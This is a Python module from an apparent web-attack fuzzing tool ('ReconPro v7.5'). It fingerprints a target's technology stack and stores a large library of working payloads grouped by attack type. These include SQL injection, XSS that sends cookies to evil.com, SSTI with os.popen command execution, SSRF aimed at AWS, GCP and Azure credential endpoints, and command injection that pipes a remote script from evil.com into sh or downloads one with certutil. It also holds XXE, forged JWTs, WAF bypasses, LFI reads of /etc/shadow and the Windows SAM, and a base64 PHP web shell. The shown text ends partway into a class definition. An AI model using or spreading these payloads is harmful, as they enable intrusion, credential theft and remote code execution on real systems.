"""
ReconPro v7.5 — Context-Aware Payload Fuzzing Engine
=====================================================
Selects intelligent payloads based on the target's detected technology stack
instead of blindly testing all payloads against every parameter.

Zero external dependencies — uses only stdlib (urllib, re, dataclasses, etc.).
"""

from __future__ import annotations

import re
import time
import json
import urllib.parse
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Optional

from .http_layer import _unverified_context


# ──────────────────────────────────────────────────────────────────────────────
# TECH_SIGNATURES — Clues for fingerprinting the target technology stack
# ──────────────────────────────────────────────────────────────────────────────

TECH_SIGNATURES: dict[str, dict[str, str | list[str]]] = {
    "headers": {
        "X-Powered-By": {
            "Express": "Express",
            "PHP": "PHP",
            "ASP.NET": "ASP.NET",
            "Next.js": "Next.js",
            "React": "React",
            "Vue": "Vue",
            "Nuxt": "Nuxt",
            "Ruby": "Ruby",
            "Phusion Passenger": "Ruby",
            "Perl": "Perl",
            "Werkzeug": "Python",
            "gunicorn": "Python",
            "uvicorn": "Python",
            "FastAPI": "Python",
            "Starlette": "Python",
            "Django": "Django",
            "Flask": "Flask",
            "Tornado": "Tornado",
            "Jetty": "Java",
            "Tomcat": "Java",
            "WebLogic": "Java",
            "WebSphere": "Java",
            "WildFly": "Java",
        },
        "Server": {
            "nginx": "nginx",
            "Apache": "Apache",
            "Microsoft-IIS": "IIS",
            "cloudflare": "Cloudflare",
            "Caddy": "Caddy",
            "LiteSpeed": "LiteSpeed",
            "OpenResty": "OpenResty",
            "Tengine": "Tengine",
            "Kestrel": "ASP.NET Core",
            "uvicorn": "Python",
            "gunicorn": "Python",
            "GWS": "Google",
            "AmazonS3": "Amazon S3",
            "GitHub.com": "GitHub Pages",
            "Varnish": "Varnish",
        },
        "X-Drupal-Cache": {"": "Drupal"},
        "X-Generator": {
            "Drupal": "Drupal",
            "WordPress": "WordPress",
            "Joomla": "Joomla",
            "Ghost": "Ghost",
            "Hugo": "Hugo",
            "Hexo": "Hexo",
        },
        "X-AspNet-Version": {"": "ASP.NET"},
        "X-AspNetMvc-Version": {"": "ASP.NET MVC"},
        "X-Runtime": {"": "Ruby"},
        "X-Served-By": {"": "Fastly"},
        "X-Jenkins": {"": "Jenkins"},
        "X-Cache": {
            "HIT": "Varnish",
            "MISS": "Varnish",
        },
        "X-WordPress": {"": "WordPress"},
    },
    "html_meta": {
        "generator": {
            "WordPress": "WordPress",
            "Joomla": "Joomla",
            "Drupal": "Drupal",
            "Ghost": "Ghost",
            "Typecho": "Typecho",
            "Hexo": "Hexo",
            "Hugo": "Hugo",
            "vBulletin": "vBulletin",
            "phpBB": "phpBB",
            "MediaWiki": "MediaWiki",
        },
        "viewport": {
            "width=device-width": "Responsive Design",
        },
        "csrf-token": {
            "": "CSRF Protection",
        },
    },
    "cookies": {
        "PHPSESSID": "PHP",
        "JSESSIONID": "Java",
        "ASP.NET_SessionId": "ASP.NET",
        "_rails_session": "Rails",
        "_session_id": "Rails",
        "laravel_session": "Laravel",
        "ci_session": "CodeIgniter",
        "rack.session": "Ruby",
        "connect.sid": "Express",
        "jsessionid": "Java",
        "ASPSESSIONID": "ASP.NET",
        "django_session": "Django",
        "csrftoken": "Django",
        "XSRF-TOKEN": "Angular",
        "ngx_session": "nginx",
        "next-auth.session-token": "Next.js",
    },
    "url_patterns": {
        "/wp-admin": "WordPress",
        "/wp-content": "WordPress",
        "/wp-includes": "WordPress",
        "/wp-json": "WordPress",
        "/wp-login": "WordPress",
        "/xmlrpc.php": "WordPress",
        "/administrator": "Joomla",
        "/media/system": "Joomla",
        "/index.php?option=": "Joomla",
        "/user/register": "Drupal",
        "/sites/default": "Drupal",
        "/graphql": "GraphQL",
        "/graphiql": "GraphQL",
        "/api/graphql": "GraphQL",
        "/api/v1/": "REST API",
        "/api/v2/": "REST API",
        "/swagger": "Swagger/OpenAPI",
        "/api-docs": "Swagger/OpenAPI",
        "/actuator": "Spring Boot",
        "/manage.py": "Django",
        "/flask": "Flask",
        "/.env": "Dotenv",
        "/robots.txt": "Standard Site",
    },
    "js_libraries": {
        "react.production.min.js": "React",
        "react.development.js": "React",
        "react-dom": "React",
        "react.min.js": "React",
        "angular.min.js": "Angular",
        "angular.js": "Angular",
        "ng.app": "Angular",
        "vue.min.js": "Vue",
        "vue.js": "Vue",
        "nuxt": "Vue (Nuxt)",
        "vue.runtime": "Vue",
        "jquery.min.js": "jQuery",
        "jquery.js": "jQuery",
        "jquery-": "jQuery",
        "lodash.min.js": "Lodash",
        "bootstrap.min.js": "Bootstrap",
        "svelte": "Svelte",
        "next/dist": "Next.js",
        "_next/static": "Next.js",
        "alpine": "Alpine.js",
        "htmx": "htmx",
        "axios": "Axios",
        "d3.min.js": "D3.js",
        "three": "Three.js",
        "moment.min.js": "Moment.js",
    },
    "file_extensions": {
        ".php": "PHP",
        ".asp": "ASP",
        ".aspx": "ASP.NET",
        ".jsp": "Java",
        ".do": "Java (Struts)",
        ".action": "Java (Struts)",
        ".py": "Python",
        ".rb": "Ruby",
        ".go": "Go",
        ".rs": "Rust",
        ".pl": "Perl",
        ".cgi": "CGI",
        ".cfm": "ColdFusion",
        ".dll": "IIS",
    },
    "waf_signatures": {
        "X-WAF-Event": "WAF",
        "X-Sucuri-ID": "Sucuri WAF",
        "X-CDN": "Imperva Cloud WAF",
        "X-Veracode-HASH": "Veracode WAF",
        "CF-RAY": "Cloudflare WAF",
        "__cfduid": "Cloudflare WAF",
        "X-Akamai-GS": "Akamai WAF",
        "X-DefendID": "DefendID WAF",
        "X-Iinfo": "F5 BIG-IP ASM",
        "X-Applereason": "Apple WAF",
        "NSC": "NetScaler WAF",
        "CitrixNS_ID": "Citrix WAF",
        "X-WAF-Block": "Generic WAF",
        "X-Frame-Options": "Security Headers Present",
    },
}


# ──────────────────────────────────────────────────────────────────────────────
# LFI / RFI Payload Sets — Flat lists for Local & Remote File Inclusion
# ──────────────────────────────────────────────────────────────────────────────

_LFI_PAYLOADS: list[str] = [
    # Basic LFI
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../etc/group",
    "../../../../../../../../etc/hostname",
    "../../../../../../../../etc/resolv.conf",
    "../../../../../../../../etc/issue",
    "../../../../../../../../etc/motd",
    "../../../../../../../../etc/crontab",
    "../../../../../../../../etc/environment",
    # Linux-specific
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../proc/self/cmdline",
    "../../../../../../../../proc/self/status",
    "../../../../../../../../proc/version",
    "../../../../../../../../proc/mounts",
    "../../../../../../../../var/log/auth.log",
    "../../../../../../../../var/log/syslog",
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/nginx/access.log",
    # Windows-specific
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../../../windows/win.ini",
    "../../../../../../../../windows/system32/config/sam",
    "../../../../../../../../windows/repair/sam",
    "../../../../../../../../windows/debug/NetSetup.log",
    "../../../../../../../../windows/ntds/ntds.dit",
    # Encoded variants
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc%2fpasswd",
    # NULL byte
    "../../../../../../../../etc/passwd%00",
    "../../../../../../../../etc/passwd%00.jpg",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,",
    "expect://id",
    "phar://",
    # Double encoding
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
    # UTF-8 overlong
    "..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd",
    # Path truncation (Windows)
    "../../../../../../../../etc/passwd...............",
    "../../../../../../../../etc/passwd/././././././.",
]

_RFI_PAYLOADS: list[str] = [
    "http://example.com/shell.txt",
    "https://raw.githubusercontent.com/test/payload/main/shell.txt",
    "ftp://example.com/payload.txt",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
    "expect://id",
    "php://filter/convert.base64-encode/resource=http://example.com/shell.php",
]


# ──────────────────────────────────────────────────────────────────────────────
# PAYLOAD_DATABASE — Real pentesting payloads organized by category & framework
# ──────────────────────────────────────────────────────────────────────────────

PAYLOAD_DATABASE: dict[str, dict[str, list[str]]] = {

    # ── SQL Injection ──────────────────────────────────────────────────────
    "sqli": {
        "mysql": [
            "' OR '1'='1",
            "1' OR '1'='1' -- ",
            "' OR 1=1 -- ",
            "' UNION SELECT NULL, username, password FROM users-- ",
            "' UNION SELECT 1, table_name FROM information_schema.tables-- ",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
            "' AND BENCHMARK(5000000,SHA1('test'))-- ",
            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- ",
            "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- ",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
        ],
        "postgres": [
            "' OR '1'='1",
            "1' OR '1'='1'--",
            "' UNION SELECT NULL, table_name FROM information_schema.tables--",
            "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
            "1; SELECT pg_sleep(5)--",
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            "'::int; SELECT 1--",
            "' UNION SELECT NULL, current_database()--",
            "' UNION SELECT NULL, version()--",
            "' UNION SELECT NULL, current_user--",
            "' AND 1=CAST((SELECT version()) AS INT)--",
        ],
        "mssql": [
            "' OR '1'='1",
            "1' OR '1'='1'--",
            "' UNION SELECT NULL, name FROM sysobjects WHERE xtype='U'--",
            "' UNION SELECT NULL, name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--",
            "1; WAITFOR DELAY '0:0:5'--",
            "'; EXEC master..xp_cmdshell('nslookup attacker.com')--",
            "' UNION SELECT NULL, @@version--",
            "' UNION SELECT NULL, DB_NAME()--",
            "' UNION SELECT NULL, SYSTEM_USER--",
            "' AND 1=CONVERT(INT,(SELECT @@version))--",
        ],
        "sqlite": [
            "' OR '1'='1",
            "1' OR '1'='1'--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT 1, sqlite_version()--",
            "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--",
            "1' AND load_extension('libc')--",
            "' UNION SELECT NULL, tbl_name FROM sqlite_master WHERE type='table'--",
            "1' UNION SELECT hex(zeroblob(8192))--",
            "' AND (SELECT count(*) FROM sqlite_master WHERE type='table')>0--",
        ],
        "oracle": [
            "' OR '1'='1",
            "' UNION SELECT NULL, table_name FROM all_tables--",
            "' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS'--",
            "' UNION SELECT NULL, banner FROM v$version--",
            "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5)='a'--",
            "' UNION SELECT NULL, SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual--",
            "' UNION SELECT NULL, user FROM dual--",
            "' AND (SELECT UTL_INADDR.get_host_address FROM dual) IS NOT NULL--",
            "' UNION SELECT NULL, ORA_DATABASE_NAME FROM dual--",
            "' OR 1=1||CHR(59)--",
        ],
        "generic": [
            "' OR '1'='1",
            "1 OR 1=1",
            "' OR 1=1--",
            "' OR '1'='1'/*",
            "1' OR '1'='1' -- -",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,username,password FROM users--",
            "1; DROP TABLE users--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR ''='",
            "admin'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 9999--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
            "1' GROUP BY 1--",
            "' AND SUBSTRING(username,1,1)='a'--",
            "1' AND 1=1 UNION SELECT NULL, @@version--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
    },

    # ── Cross-Site Scripting (XSS) ─────────────────────────────────────────
    "xss": {
        "html": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            '<a href="javascript:alert(1)">click</a>',
            '<input onfocus=alert(1) autofocus>',
            '<div style="background:url(javascript:alert(1))">',
        ],
        "angular": [
            "{{7*7}}",
            "{{constructor.constructor('return alert()')()}}",
            "{{$eval.constructor('return alert()')()}}",
            "{{x='constructor';y=x;alert(y)}}",
            "{{''.constructor.constructor('alert(1)')()}}",
            "{{toString.constructor('return alert()')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{[].constructor.constructor('alert(1)')()}}",
            "{{0.constructor.constructor('alert(1)')()}}",
            "{{a=toString;b=a.constructor;b('alert(1)')()}}",
        ],
        "react": [
            "{{}}",
            '{"__proto__":{"isAdmin":1}}',
            '{"constructor":{"prototype":{"isAdmin":true}}}',
            '<script src="https://evil.com/1.js"></script>',
            'javascript:alert(1)',
            '<img src=x onerror="window.location=\'https://evil.com/?c=\'+document.cookie">',
            '<a href="https://evil.com" target="_blank" rel="opener">click</a>',
            '"><img src=x onerror=alert(document.domain)>',
            "'-alert(1)-'",
            "<script>document.body.innerHTML=''</script>",
        ],
        "vue": [
            "{{7*7}}",
            "{{this.constructor.constructor('return this')().alert(1)}}",
            "{{constructor.constructor('return alert(1)')()}}",
            "${7*7}",
            "{{_c.constructor('alert(1)')()}}",
            "{{[].pop.constructor('alert(1)')()}}",
            "{{'a'.constructor.constructor('alert(1)')()}}",
            "{{$data.constructor.constructor('alert(1)')()}}",
            "{{typeof this}}",
            "{{[this][0].constructor.constructor('alert(1)')()}}",
        ],
        "generic": [
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=1 onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "'';!--\"<xss>=&{()}",
            "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
            "<div data-x=\"\"><img src=x onerror=alert(1)//\"></div>",
            "javascript:void(0)//\"",
            "'-alert(1)-'",
            "<img src=x:alert(alt) onerror=eval(src)>",
            "prompt(1)",
        ],
    },

    # ── Server-Side Template Injection (SSTI) ──────────────────────────────
    "ssti": {
        "jinja2": [
            "{{7*7}}",
            "{{config}}",
            "{{self.__init__.__globals__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{cycler.__init__.__globals__.os}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "django": [
            "{% debug %}",
            "{{request}}",
            "{% load debug %}",
            "{% debug context %}",
            "{{settings.SECRET_KEY}}",
            "{{settings.DATABASES}}",
            "{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
            "{{user}}",
        ],
        "mako": [
            "${7*7}",
            "${self._modules[context]}}",
            "<%import os%>${os.popen('id').read()}",
            "${__import__('os').popen('id').read()}",
            "<%=7*7%>",
            "${self.__init__.__globals__['os'].popen('id').read()}",
            "${request.environ}",
            "${self.template.module.__builtins__.__import__('os').popen('id').read()}",
        ],
        "twig": [
            "{{7*7}}",
            "{{_self}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{dump(app)}}",
            "{{app.request.server.all|join(',')}}",
            "{%for x in _context%}{{x}}{%endfor%}",
            "{{_context|json_encode}}",
        ],
        "generic": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%=7*7%>",
            "${{7*7}}",
            "#{% debug %}",
            "${{config}}",
            "{{7*'7'}}",
            "{{'{{'}}",
            "{{config.items()}}",
        ],
    },

    # ── Server-Side Request Forgery (SSRF) ─────────────────────────────────
    "ssrf": {
        "aws_metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ],
        "gcp_metadata": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/os-login/users",
        ],
        "azure_metadata": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/plan?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/identity?api-version=2021-02-01",
        ],
        "generic": [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://[::1]/",
            "http://0.0.0.0/",
            "http://127.0.0.1:80/",
            "http://localhost:8080/",
            "http://2130706433/",
            "http://0x7f000001/",
            "http://127.1/",
            "http://127.0.0.1./",
            "http://0177.0.0.1/",
            "http://10.0.0.1/",
            "http://192.168.1.1/",
            "http://172.16.0.1/",
            "http://169.254.169.254/",
            "http://metadata/",
        ],
    },

    # ── Path Traversal ─────────────────────────────────────────────────────
    "path_traversal": {
        "unix": [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..../..../..../etc/passwd",
            "/..../..../..../etc/passwd",
            "../../../etc/shadow",
        ],
        "windows": [
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "....\\....\\....\\windows\\win.ini",
            "C:\\windows\\system32\\config\\sam",
            "..\\..\\..\\..\\boot.ini",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            "..\\..\\..\\..\\windows\\repair\\sam",
            "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
        ],
        "generic": [
            "../",
            "../../",
            "../../../",
            "..%2f",
            "%2e%2e/",
            "..%00/",
            "..%252f",
            "..%c0%af",
            "..%ef%bc%8f",
            "..\\",
            "..././..././..././",
            "/.",
            "//",
            "..;/",
            "..%0d%0a/",
            "..\\%0d%0a/",
        ],
    },

    # ── Command Injection ────────────────────────────────────────────────────
    "command_injection": {
        "unix": [
            "; id",
            "| id",
            "$(id)",
            "`id`",
            "&& id",
            "|| id",
            "\nid",
            "|| whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "; ls -la /",
            "| ping -c 4 127.0.0.1",
            "$(sleep 5)",
            "; curl https://evil.com/shell.sh|sh",
        ],
        "windows": [
            "& whoami",
            "| whoami",
            "%0a whoami",
            "^whoami",
            "&& whoami",
            "|| whoami",
            "& dir C:\\",
            "| dir C:\\",
            "%0d%0a dir C:\\",
            "& net user",
            "& ipconfig /all",
            "& tasklist",
            "& systeminfo",
            "& ping -n 4 127.0.0.1",
            "certutil -urlcache -split -f https://evil.com/payload.exe",
        ],
        "generic": [
            ";",
            "|",
            "&",
            "&&",
            "||",
            "$(",
            "`",
            "\n",
            "\r\n",
            "%0a",
            "%0d%0a",
            "|",
            ";",
            "&",
            "$(sleep 5)&",
            "' sleep 5 '",
        ],
    },

    # ── LDAP Injection ──────────────────────────────────────────────────────
    "ldap_injection": {
        "generic": [
            "*()(&)",
            "*()|(&",
            "*)(uid=*))(|(uid=*",
            "admin*",
            "admin*)((|(uid=*",
            "*)(uid=*))",
            "*()%",
            "*%00",
            "*)(|(objectclass=*))",
            "(|(cn=*)(objectclass=user))",
            "*)(objectClass=user))(",
            "*)(objectClass=*))(",
            "*)(uid=*",
            "*)(&",
            ")(cn=*)(objectClass=user))",
            "*)(cn=*))%00",
        ],
    },

    # ── XML External Entity (XXE) ────────────────────────────────────────────
    "xxe": {
        "generic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/_SMTP%20INJECTION">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar://file:///tmp/evil.jar!/evil.txt">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc://etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><foo>test</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8=">]><foo>&xxe;</foo>',
        ],
    },

    # ── JWT Bypass ─────────────────────────────────────────────────────────
    "jwt_bypass": {
        "generic": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiJ9.",
            "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsInN1YiI6IjEyMzQ1Njc4OTAifQ.",
            '{"alg":"none","typ":"JWT"}.{"user":"admin"}.',
            '{"alg":"HS256","typ":"JWT"}.{"user":"admin"}.invalid_sig',
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJITUFDU0hBMjU2IiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJBbm9ueW1vdXMiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.",
            '{"kid":"../../dev/null","alg":"HS256"}.{"user":"admin"}.',
            '{"kid":"key\";\nRS256;//","alg":"HS256","typ":"JWT"}.{"user":"admin"}.',
            '{"alg":"HS256","kid":"1; SELECT 1--","typ":"JWT"}.{"user":"admin"}.',
            '{"alg":"RS256","jwk":{"kty":"oct","k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},"typ":"JWT"}.{"user":"admin"}.',
            '{"alg":"PS256","jwk":{"kty":"oct","k":"YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY"},"typ":"JWT"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
            '{"typ":"JWT","alg":"HS256","crit":["exp"],"exp":9223372036854775807}.{"user":"admin"}',
            '{"typ":"JWT","alg":"HS256","x5t":"../../etc/passwd"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
            '{"alg":"none","typ":"JWT"}.eyJhZG1pbiI6dHJ1ZX0.',
            "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
            '{"alg":"HS256","typ":"JWT"}.{"iss":"admin","sub":"1234567890","admin":true}',
            '{"alg":"ES256","kty":"EC","crv":"P-256","x":"admin","y":"admin"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
            '{"alg":"HS256","typ":"JWT"}.eyJpYXQiOjk5OTk5OTk5OTl9.',
            '{"typ":"JWT","alg":"none"}.eyJpZCI6MSwibmFtZSI6ImFkbWluIn0.',
        ],
    },

    # ── CORS Exploitation ───────────────────────────────────────────────────
    "cors": {
        "generic": [
            "https://evil.com",
            "https://evil.com",
            "null",
            "https://evil.com.localhost",
            "https://evil.com.127.0.0.1",
            "https://evil.com.0.0.0.0",
            "https://localhost.evil.com",
            "https://evil.com:8080",
            "https://127.0.0.1",
            "https://evil.com%.target.com",
            "https://evil.com%00.target.com",
            "https://evil.com@target.com",
            "https://target.com@evil.com",
            "https://evil.com;.target.com",
            "https://target.com.evil.com",
        ],
    },

    # ── CSRF Token Bypass ───────────────────────────────────────────────────
    "csrf": {
        "generic": [
            "DELETE",
            "remove",
            "",
            "undefined",
            "null",
            "00000000000000000000000000000000",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "test-token",
            "1234567890",
            "{\"token\":\"none\"}",
        ],
    },

    # ── Open Redirect ────────────────────────────────────────────────────────
    "open_redirect": {
        "generic": [
            "https://evil.com",
            "//evil.com",
            "https://evil.com%00.target.com",
            "/\\evil.com",
            "https://evil.com@target.com",
            "https://target.com@evil.com",
            "https://evil.com%2F%2Ftarget.com",
            "https://evil.com%5Ctarget.com",
            "https://evil.com%09target.com",
            "/https:/evil.com",
            "https:///evil.com",
            "https://evil.com%0d%0atarget.com",
            "https://evil.com%5c%5ctarget.com",
            "//evil.com/%2f..",
            "javascript:alert(1)",
        ],
    },

    # ── WAF Bypass ──────────────────────────────────────────────────────────
    "waf_bypass": {
        "space2comment": [
            "/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
            "UN/**/ION/**/SE/**/LECT/**/NULL,NULL,NULL",
            "/**/OR/**/1=1--",
            "SELECT/**/username/**/FROM/**/users",
            "UNION/**/ALL/**/SELECT",
            "/**/AND/**/1=1--",
            "/**/AND/**/1=2--",
            "SE/**/LECT/**/1,2,3/**/FROM/**/users",
            "/**/ORDER/**/BY/**/1--",
            "/**/GROUP/**/BY/**/1--",
        ],
        "case_alternation": [
            "uNiOn SeLeCt NuLl,NuLl,NuLl--",
            "UnIoN AlL SeLeCt",
            "sElEcT UsErNaMe FrOm UsErS",
            "AnD 1=1--",
            "Or 1=1--",
            "UnIoN sElEcT 1,2,3,4--",
            "SeLeCt * FrOm InFoRmAtIoN_sChEmA.tAbLeS",
            "dRoP TaBlE UsErS--",
            "InSeRt InTo UsErS VaLuEs(1,'admin','pass')--",
            "DeLeTe FrOm UsErS WhErE 1=1--",
        ],
        "unicode_normalization": [
            "u\u0300nion select null,null,null--",
            "\u0075nion \u0073elect null,null,null--",
            "and\u00001=1--",
            "sel\u0065ct * from users",
            "uni\u00f3n s\u00e9lect null,null,null",
            "UN\u00cfON SELE\u00c7T",
            "and%u00201=1--",
            "sel%u0065ct",
            "un%u0069on",
        ],
        "double_encoding": [
            "%2527 OR 1=1--",
            "%2527%2520UNION%2520SELECT%2520NULL,NULL,NULL--",
            "%252f%252f",
            "%252e%252e%252f",
            "%253Cscript%253Ealert(1)%253C/script%253E",
            "%2527%2522%253E%253Csvg%252fonload=alert(1)%253E",
            "%2522%255Ealert(1)%2522",
            "%27%20OR%201%3D1--",
            "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
            "%2522%253E%253Cscript%253Ealert(document.cookie)%253C/script%253E",
        ],
    },

    # ── Local File Inclusion (LFI) ──────────────────────────────────────────
    "lfi": {
        "generic": _LFI_PAYLOADS,
    },

    # ── Remote File Inclusion (RFI) ─────────────────────────────────────────
    "rfi": {
        "generic": _RFI_PAYLOADS,
    },
}


# ──────────────────────────────────────────────────────────────────────────────
# TECH_PROFILE — Data container for fingerprinting results
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class TechProfile:
